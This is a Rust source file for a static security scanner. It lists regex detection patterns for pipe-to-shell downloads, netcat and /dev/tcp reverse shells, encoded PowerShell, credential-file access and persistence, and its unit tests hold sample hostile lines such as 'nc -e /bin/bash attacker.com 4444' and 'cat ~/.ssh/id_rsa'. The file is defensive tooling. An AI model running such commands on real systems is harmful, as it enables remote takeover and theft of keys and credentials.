//! Regex-based static pattern scan (zero AI cost).

use regex::Regex;
use std::collections::HashMap;

use crate::constants::SNIPPET_MAX_CHARS;
use crate::policy::{load_effective_policy, resolve_rule_severity};
use crate::snippet::safe_snippet;
use crate::types::{
    DetectionKind, DetectionTaxonomy, ResolvedSecurityScanPolicy, RiskLevel, ScannedFile,
    StaticFinding, default_confidence_for_severity,
};

struct PatternDef {
    id: &'static str,
    regex: &'static str,
    severity: RiskLevel,
    description: &'static str,
}

/// Maps a static pattern ID to its detection taxonomy.
/// This provides explicit classification for all unsafe-behavior patterns
/// detected by the static pattern analyzer.
fn pattern_taxonomy(pattern_id: &str) -> DetectionTaxonomy {
    match pattern_id {
        // Remote script execution / pipe-to-shell
        "curl_pipe_sh" | "wget_pipe_sh" => {
            DetectionTaxonomy::with_kind(DetectionKind::capability("remote-script-execution"))
        }
        // Dynamic code execution from remote source
        "eval_fetch" | "exec_requests" => {
            DetectionTaxonomy::with_kind(DetectionKind::capability("dynamic-code-execution"))
        }
        // Base64 decode piped to execution
        "base64_decode_exec" => {
            DetectionTaxonomy::with_kind(DetectionKind::capability("decode-to-exec"))
        }
        // Reverse shell patterns
        "reverse_shell" | "bash_reverse" => {
            DetectionTaxonomy::with_kind(DetectionKind::capability("reverse-shell"))
        }
        // Encoded command execution
        "powershell_encoded" => {
            DetectionTaxonomy::with_kind(DetectionKind::capability("encoded-command-execution"))
        }
        // Persistence mechanisms (shell RC, cron, scheduled tasks, registry)
        "modify_shell_rc"
        | "cron_persistence"
        | "schtasks_persistence"
        | "registry_persistence" => {
            DetectionTaxonomy::with_kind(DetectionKind::capability("persistence"))
        }
        // Credential / secret access (SSH, AWS, GPG, env files, system passwd)
        "sensitive_ssh"
        | "sensitive_aws"
        | "sensitive_gnupg"
        | "sensitive_env"
        | "sensitive_etc_passwd" => {
            DetectionTaxonomy::with_kind(DetectionKind::secrets("credential-access"))
        }
        // Obfuscation (Unicode bidi, long base64)
        "unicode_bidi" | "long_base64" => {
            DetectionTaxonomy::with_kind(DetectionKind::pattern("obfuscation"))
        }
        // Package installation (npm global, pip)
        "npm_global_install" | "pip_install" => {
            DetectionTaxonomy::with_kind(DetectionKind::pattern("package-install"))
        }
        // Fallback — should not reach here but classifies as pattern for safety
        _ => DetectionTaxonomy::with_kind(DetectionKind::pattern("unsafe-behavior")),
    }
}

fn resolve_pattern_policy(
    pattern: &PatternDef,
    policy: &ResolvedSecurityScanPolicy,
) -> Option<RiskLevel> {
    resolve_rule_severity(pattern.id, pattern.severity, policy)
}

const STATIC_PATTERNS: &[PatternDef] = &[
    PatternDef {
        id: "curl_pipe_sh",
        regex: r"curl\s+[^\|]+\|\s*(sh|bash|zsh)",
        severity: RiskLevel::Critical,
        description: "Remote script piping: curl output piped to shell",
    },
    PatternDef {
        id: "wget_pipe_sh",
        regex: r"wget\s+[^\|]+\|\s*(sh|bash|zsh)",
        severity: RiskLevel::Critical,
        description: "Remote script piping: wget output piped to shell",
    },
    PatternDef {
        id: "base64_decode_exec",
        regex: r"base64\s+(-d|--decode)\s*\|",
        severity: RiskLevel::High,
        description: "Base64 decode piped to execution",
    },
    PatternDef {
        id: "eval_fetch",
        regex: r"eval\s*\(\s*(fetch|require|import)\s*\(",
        severity: RiskLevel::Critical,
        description: "Dynamic code execution from remote source",
    },
    PatternDef {
        id: "exec_requests",
        regex: r"exec\s*\(\s*requests\.(get|post)",
        severity: RiskLevel::Critical,
        description: "Python exec() with HTTP request",
    },
    PatternDef {
        id: "sensitive_ssh",
        regex: r"~/\.ssh/|~/.ssh/|\.ssh/id_|\.ssh/authorized_keys|\.ssh/config",
        severity: RiskLevel::High,
        description: "Access to SSH keys or config",
    },
    PatternDef {
        id: "sensitive_aws",
        regex: r"~/\.aws/|~/.aws/|\.aws/credentials|\.aws/config",
        severity: RiskLevel::High,
        description: "Access to AWS credentials",
    },
    PatternDef {
        id: "sensitive_env",
        regex: r"(?i)(cat|read|source|load)\s+.*\.env\b",
        severity: RiskLevel::Medium,
        description: "Reading .env file (may contain secrets)",
    },
    PatternDef {
        id: "sensitive_etc_passwd",
        regex: r"/etc/passwd|/etc/shadow",
        severity: RiskLevel::High,
        description: "Access to system password files",
    },
    PatternDef {
        id: "sensitive_gnupg",
        regex: r"~/\.gnupg/|~/.gnupg/",
        severity: RiskLevel::High,
        description: "Access to GPG keys",
    },
    PatternDef {
        id: "npm_global_install",
        regex: r"npm\s+install\s+(-g|--global)",
        severity: RiskLevel::Medium,
        description: "Global npm package installation",
    },
    PatternDef {
        id: "pip_install",
        regex: r"pip3?\s+install\s",
        severity: RiskLevel::Low,
        description: "Python package installation",
    },
    PatternDef {
        id: "unicode_bidi",
        regex: r"[\u{202A}-\u{202E}\u{2066}-\u{2069}]",
        severity: RiskLevel::High,
        description: "Unicode bidirectional control character (potential text spoofing)",
    },
    PatternDef {
        id: "reverse_shell",
        regex: r"(?i)(nc|ncat|netcat)\s+(-e|--exec|-c)",
        severity: RiskLevel::Critical,
        description: "Potential reverse shell via netcat",
    },
    PatternDef {
        id: "bash_reverse",
        regex: r"bash\s+-i\s+>&\s*/dev/tcp/",
        severity: RiskLevel::Critical,
        description: "Bash reverse shell via /dev/tcp",
    },
    PatternDef {
        id: "modify_shell_rc",
        regex: r">>?\s*~/?\.(bashrc|zshrc|profile|bash_profile)",
        severity: RiskLevel::High,
        description: "Modifying shell startup config for persistence",
    },
    PatternDef {
        id: "cron_persistence",
        regex: r"crontab\s+(-e|-l|-r)|/etc/cron",
        severity: RiskLevel::High,
        description: "Cron job manipulation for persistence",
    },
    PatternDef {
        id: "powershell_encoded",
        regex: r"(?i)powershell\s+.*-enc(odedcommand)?\s+[A-Za-z0-9+/=]{20,}",
        severity: RiskLevel::Critical,
        description: "PowerShell encoded command execution (may conceal payload)",
    },
    PatternDef {
        id: "schtasks_persistence",
        regex: r"(?i)schtasks\s+/create\s",
        severity: RiskLevel::High,
        description: "Windows scheduled task creation for persistence",
    },
    PatternDef {
        id: "registry_persistence",
        regex: r"(?i)reg\s+add\s+.*(Run|RunOnce|Startup)",
        severity: RiskLevel::High,
        description: "Windows registry modification for auto-start persistence",
    },
];

/// Run static pattern matching on all files (zero AI cost).
/// All regex patterns (including base64) are compiled once via LazyLock.
pub fn static_pattern_scan(files: &[ScannedFile]) -> Vec<StaticFinding> {
    let policy = load_effective_policy();
    static_pattern_scan_with_policy(files, &policy)
}

pub(crate) fn static_pattern_scan_with_policy(
    files: &[ScannedFile],
    policy: &ResolvedSecurityScanPolicy,
) -> Vec<StaticFinding> {
    static COMPILED_PATTERNS: std::sync::LazyLock<Vec<(&'static PatternDef, Regex)>> =
        std::sync::LazyLock::new(|| {
            STATIC_PATTERNS
                .iter()
                .filter_map(|p| Regex::new(p.regex).ok().map(|re| (p, re)))
                .collect()
        });
    static B64_RE: std::sync::LazyLock<Regex> =
        std::sync::LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{100,}={0,3}").unwrap());

    let compiled = &*COMPILED_PATTERNS;
    let b64_re = &*B64_RE;
    let mut enabled_pattern_severity: HashMap<&'static str, RiskLevel> = HashMap::new();
    for pattern in STATIC_PATTERNS {
        if let Some(severity) = resolve_pattern_policy(pattern, policy) {
            if severity.severity_ord() >= policy.min_severity.severity_ord() {
                enabled_pattern_severity.insert(pattern.id, severity);
            }
        }
    }

    let b64_rule = PatternDef {
        id: "long_base64",
        regex: "",
        severity: RiskLevel::Medium,
        description: "Long base64-encoded string (may conceal payload)",
    };
    let b64_rule_enabled = resolve_pattern_policy(&b64_rule, policy)
        .map(|severity| severity.severity_ord() >= policy.min_severity.severity_ord())
        .unwrap_or(false);
    let b64_rule_severity = resolve_pattern_policy(&b64_rule, policy).unwrap_or(RiskLevel::Medium);

    let mut findings = Vec::new();

    for file in files {
        for (line_number, line) in file.content.lines().enumerate() {
            for (pattern, re) in compiled {
                let Some(severity) = enabled_pattern_severity.get(pattern.id).copied() else {
                    continue;
                };
                if re.is_match(line) {
                    let snippet = safe_snippet(line, SNIPPET_MAX_CHARS);
                    findings.push(StaticFinding {
                        file_path: file.relative_path.clone(),
                        line_number: line_number + 1,
                        pattern_id: pattern.id.to_string(),
                        snippet,
                        severity,
                        confidence: default_confidence_for_severity(severity),
                        description: pattern.description.to_string(),
                        taxonomy: Some(pattern_taxonomy(pattern.id)),
                    });
                }
            }
            if b64_rule_enabled && b64_re.is_match(line) {
                findings.push(StaticFinding {
                    file_path: file.relative_path.clone(),
                    line_number: line_number + 1,
                    pattern_id: "long_base64".to_string(),
                    snippet: safe_snippet(line, SNIPPET_MAX_CHARS),
                    severity: b64_rule_severity,
                    confidence: default_confidence_for_severity(b64_rule_severity),
                    description: "Long base64-encoded string (may conceal payload)".to_string(),
                    taxonomy: Some(pattern_taxonomy("long_base64")),
                });
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run_pattern_scan(files: &[ScannedFile]) -> Vec<StaticFinding> {
        let policy = crate::policy::resolve_policy(&crate::SecurityScanPolicy {
            preset: "balanced".to_string(),
            severity_threshold: "low".to_string(),
            enabled_analyzers: vec![],
            ignore_rules: vec![],
            rule_overrides: std::collections::HashMap::new(),
        });
        static_pattern_scan_with_policy(files, &policy)
    }

    fn scan_file(path: &str, content: &str) -> ScannedFile {
        ScannedFile {
            relative_path: path.to_string(),
            content: content.to_string(),
            size_bytes: content.len(),
            content_digest: format!("digest-{path}"),
        }
    }

    #[test]
    fn curl_pipe_sh_has_capability_taxonomy() {
        let files = &[scan_file(
            "install.sh",
            "curl https://example.com/install.sh | sh",
        )];
        let findings = run_pattern_scan(files);
        let finding = findings
            .iter()
            .find(|f| f.pattern_id == "curl_pipe_sh")
            .expect("curl_pipe_sh finding should be present");
        assert!(
            finding.taxonomy.is_some(),
            "curl_pipe_sh must have taxonomy"
        );
        let taxonomy = finding.taxonomy.as_ref().unwrap();
        assert_eq!(
            taxonomy.detection_kind.as_ref().unwrap().family,
            crate::types::DetectionFamily::Capability,
        );
        assert_eq!(
            taxonomy.detection_kind.as_ref().unwrap().kind,
            "remote-script-execution",
        );
    }

    #[test]
    fn reverse_shell_has_capability_taxonomy() {
        let files = &[scan_file("payload.sh", "nc -e /bin/bash attacker.com 4444")];
        let findings = run_pattern_scan(files);
        let finding = findings
            .iter()
            .find(|f| f.pattern_id == "reverse_shell")
            .expect("reverse_shell finding should be present");
        assert!(finding.taxonomy.is_some());
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .family,
            crate::types::DetectionFamily::Capability,
        );
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .kind,
            "reverse-shell",
        );
    }

    #[test]
    fn sensitive_ssh_has_secrets_taxonomy() {
        let files = &[scan_file("check.sh", "cat ~/.ssh/id_rsa")];
        let findings = run_pattern_scan(files);
        let finding = findings
            .iter()
            .find(|f| f.pattern_id == "sensitive_ssh")
            .expect("sensitive_ssh finding should be present");
        assert!(finding.taxonomy.is_some());
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .family,
            crate::types::DetectionFamily::Secrets,
        );
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .kind,
            "credential-access",
        );
    }

    #[test]
    fn unicode_bidi_has_pattern_obfuscation_taxonomy() {
        let files = &[scan_file("readme.md", "Hello\u{202E} World")] as &[ScannedFile];
        let findings = run_pattern_scan(files);
        let finding = findings
            .iter()
            .find(|f| f.pattern_id == "unicode_bidi")
            .expect("unicode_bidi finding should be present");
        assert!(finding.taxonomy.is_some());
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .family,
            crate::types::DetectionFamily::Pattern,
        );
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .kind,
            "obfuscation",
        );
    }

    #[test]
    fn npm_global_install_has_pattern_package_install_taxonomy() {
        let files = &[scan_file("setup.sh", "npm install -g somepackage")];
        let findings = run_pattern_scan(files);
        let finding = findings
            .iter()
            .find(|f| f.pattern_id == "npm_global_install")
            .expect("npm_global_install finding should be present");
        assert!(finding.taxonomy.is_some());
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .family,
            crate::types::DetectionFamily::Pattern,
        );
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .kind,
            "package-install",
        );
    }

    #[test]
    fn cron_persistence_has_capability_taxonomy() {
        let files = &[scan_file("setup.sh", "crontab -e")];
        let findings = run_pattern_scan(files);
        let finding = findings
            .iter()
            .find(|f| f.pattern_id == "cron_persistence")
            .expect("cron_persistence finding should be present");
        assert!(finding.taxonomy.is_some());
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .family,
            crate::types::DetectionFamily::Capability,
        );
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .kind,
            "persistence",
        );
    }

    #[test]
    fn all_pattern_ids_have_taxonomy() {
        let files = &[scan_file(
            "all.sh",
            "curl https://x.com | sh\nnc -e cmd\ncat ~/.ssh/id_rsa\nnpm install -g x",
        )];
        let findings = run_pattern_scan(files);
        for finding in &findings {
            assert!(
                finding.taxonomy.is_some(),
                "finding {} must have taxonomy",
                finding.pattern_id
            );
        }
        let ids: Vec<_> = findings.iter().map(|f| f.pattern_id.clone()).collect();
        assert!(
            ids.contains(&"curl_pipe_sh".to_string()),
            "should detect curl_pipe_sh"
        );
        assert!(
            ids.contains(&"reverse_shell".to_string()),
            "should detect reverse_shell"
        );
        assert!(
            ids.contains(&"sensitive_ssh".to_string()),
            "should detect sensitive_ssh"
        );
        assert!(
            ids.contains(&"npm_global_install".to_string()),
            "should detect npm_global_install"
        );
    }

    #[test]
    fn long_base64_has_pattern_obfuscation_taxonomy() {
        let long_b64 = "VGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgc3RyaW5nIHRoYXQgbG9va3MgbGlrZSB0aGlzOkFWMzJERjlCREIwREU5RkJEQjBURUFWMTJZQkVCMERFQT09EQjBURUFWMTJZQkVCMERFQT09EQjBURUFWMTJZQkVCMERFQT09EQjBURUFWMTJZQkVCMERFQT09EQjBURUFWMTJZQkVCMERFQT09E".to_string();
        let files = &[scan_file("data.txt", &long_b64)];
        let findings = run_pattern_scan(files);
        let finding = findings
            .iter()
            .find(|f| f.pattern_id == "long_base64")
            .expect("long_base64 finding should be present");
        assert!(finding.taxonomy.is_some());
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .family,
            crate::types::DetectionFamily::Pattern,
        );
        assert_eq!(
            finding
                .taxonomy
                .as_ref()
                .unwrap()
                .detection_kind
                .as_ref()
                .unwrap()
                .kind,
            "obfuscation",
        );
    }
}
